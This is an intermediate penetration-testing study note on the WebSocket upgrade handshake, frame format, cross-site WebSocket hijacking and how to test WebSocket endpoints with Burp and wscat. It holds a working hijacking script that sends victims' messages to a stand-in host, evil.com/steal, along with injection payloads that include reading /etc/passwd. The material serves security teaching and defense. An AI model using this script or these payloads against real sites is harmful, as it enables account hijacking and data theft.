---
tags: [vapt, http, web, intermediate]
difficulty: intermediate
module: "02 - HTTP Deep Dive"
topic: "02.22 WebSockets — Upgrade Handshake"
---

# 02.22 — WebSockets — Upgrade Handshake

## What is it?

**WebSockets** provide a persistent, full-duplex communication channel between client and server over a single TCP connection. Unlike HTTP (request → response → done), WebSockets allow both sides to send messages at any time. Used for: chat apps, real-time games, stock tickers, live notifications, collaborative tools.

---

## WebSocket Upgrade Handshake

```
STEP 1: Client sends HTTP Upgrade request
  GET /chat HTTP/1.1
  Host: target.com
  Upgrade: websocket                      ← wants WebSocket
  Connection: Upgrade                     ← upgrade this connection
  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==  ← random base64 nonce
  Sec-WebSocket-Version: 13              ← WS protocol version
  Origin: https://target.com             ← where page came from
  Cookie: session=abc123                 ← cookies sent on upgrade!

STEP 2: Server responds with 101 Switching Protocols
  HTTP/1.1 101 Switching Protocols
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
                        ↑ SHA1(client_key + GUID) → proves server understood

STEP 3: Connection upgraded — no more HTTP!
  Both sides can now send WebSocket frames at any time.
  Frames are binary (with text frame option).
  Connection stays open indefinitely.

POST-HANDSHAKE — WebSocket frames:
  Client → Server: {"action":"chat","message":"Hello!"}
  Server → Client: {"from":"alice","message":"Hello!","ts":1234567890}
```

---

## WebSocket Frame Format

```
┌──┬──┬─────────────────────────────────────────────────────┐
│FI│OP│ MASK │  Payload Length  │ Masking Key (if masked)  │
│N │CO│      │                  │                           │
│  │DE│      │                  │                           │
└──┴──┴─────────────────────────────────────────────────────┘
│            Payload Data (XOR masked if client)             │

FIN: 1 = final fragment of message
Opcode: 0x1=text, 0x2=binary, 0x8=close, 0x9=ping, 0xA=pong

CLIENT MESSAGES: MUST be masked (XOR with random 4-byte key)
SERVER MESSAGES: MUST NOT be masked
```

---

## Security Context — WebSockets in VAPT

### 1. WebSocket CSRF — No CSRF Protection by Default

```
The WebSocket handshake uses a GET request with HTTP Upgrade.
The GET request includes cookies automatically.
But there's NO built-in CSRF token for WebSocket!

ATTACK:
1. Victim visits attacker's page: evil.com
2. Attacker's JS establishes WebSocket to target.com:
   var ws = new WebSocket('wss://target.com/chat');
3. Browser sends the GET request with victim's cookies!
4. Server accepts the WebSocket (cookies are valid)
5. Attacker's JS can now send/receive messages as the victim!

DEFENSE:
  - Server checks Origin header: only allow from expected domains
  - Check Cookie + CSRF token in WebSocket handshake
  - Don't rely solely on cookies for WebSocket auth

TEST:
  In Burp, intercept the WebSocket upgrade request.
  Check if server validates Origin header.
  Change Origin to https://attacker.com → does server still accept?
```

### 2. Cross-Site WebSocket Hijacking (CSWH)

```
FULL ATTACK FLOW:

1. Target app has WebSocket at wss://target.com/ws
   Messages contain sensitive data (e.g., private chat, account info)

2. Attacker creates malicious page:
   <script>
   var ws = new WebSocket('wss://target.com/ws');
   ws.onmessage = function(e) {
     fetch('https://evil.com/steal?data=' + encodeURIComponent(e.data));
   };
   ws.onopen = function() {
     ws.send('{"action":"get_account_info"}');  ← authenticated as victim!
   };
   </script>

3. Victim visits evil.com
4. victim's browser connects to wss://target.com/ws (with victim's cookies)
5. Attacker receives victim's private data!

SIMILAR TO: CSRF but for WebSocket connections
FULL COVERAGE: [[Module 23 - WebSocket Security]]
```

### 3. WebSocket Message Injection

```
All HTTP injection attacks work through WebSocket messages too!

If WebSocket message is processed by server:
  SQLi: {"query":"' OR '1'='1"}
  XSS: {"message":"<img src=x onerror=alert(1)>"}
  Command injection: {"cmd":"ls ; cat /etc/passwd"}
  SSTI: {"template":"{{7*7}}"}
  Path traversal: {"file":"../../../etc/passwd"}

IN BURP SUITE:
  Proxy → WebSockets history → view/modify WS messages
  Right-click WS message → Send to Repeater
  Modify message in Repeater → Forward
  
  Or right-click → Send to Intruder → fuzz WS messages!
```

### 4. Testing WebSocket Authentication

```
WebSocket typically authenticated via:
a) Cookie from HTTP session (most common)
b) Token in query string: wss://target.com/ws?token=abc123
c) Token sent as first message: ws.send('{"token":"abc123"}')

TEST:
1. Connect authenticated → works
2. Remove cookie → does it still connect?
3. Use old/expired token → does it still connect?
4. Use another user's token → do you see their messages?

BURP TECHNIQUE:
  Intercept WS upgrade request → modify/remove Cookie header → forward
  Check if server rejects or accepts
```

### 5. Burp Suite with WebSockets

```
Burp Suite automatically intercepts WebSocket traffic:
  Proxy → WebSockets history tab (separate from HTTP history)
  
  All WS messages appear here — both directions
  Click any message → view/modify

  Send to Repeater:
  In Repeater, you can send arbitrary WS messages
  Server must accept after initial handshake

  Intercept mode:
  Proxy → WebSockets history → enable WebSocket interception
  Can pause each message → modify → forward
```

---

## Hands-On: WebSocket Testing

```bash
# Connect to WebSocket from command line
# wscat (npm install -g wscat):
wscat -c wss://target.com/ws
# Then type JSON messages interactively

# With auth token:
wscat -c "wss://target.com/ws?token=abc123" \
      -H "Cookie: session=def456"

# Python WebSocket client:
python3 << 'EOF'
import websocket, json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    ws.send(json.dumps({"action": "get_profile"}))

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    on_message=on_message,
    on_open=on_open,
    header={"Cookie": "session=abc123"}
)
ws.run_forever()
EOF

# Nmap WebSocket detection
nmap --script http-websocket-header-injection target.com -p 443

# Test Origin header bypass:
wscat -c wss://target.com/ws -H "Origin: https://evil.com"
# If connection succeeds → no Origin validation → CSWH possible!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CSRF via WebSocket (CSWH) | Validate Origin header server-side, reject unexpected origins |
| No auth on WebSocket | Validate session/token on upgrade AND on each message |
| WS message injection | Apply same input validation to WS messages as HTTP |
| WS exposed without TLS (ws://) | Use wss:// only (WebSocket over TLS) |
| WS message not validated for input | Sanitize all WebSocket message content |

---

## Related Notes
- [[Module 23 - WebSocket Security]] — full WebSocket attack guide
- [[11 - Cookies Structure Flags Lifecycle]] — cookie auth in WS
- [[Module 07 - CSRF]] — CSRF concepts apply to CSWH
- [[Module 02 - XSS]] — XSS via WS reflected messages
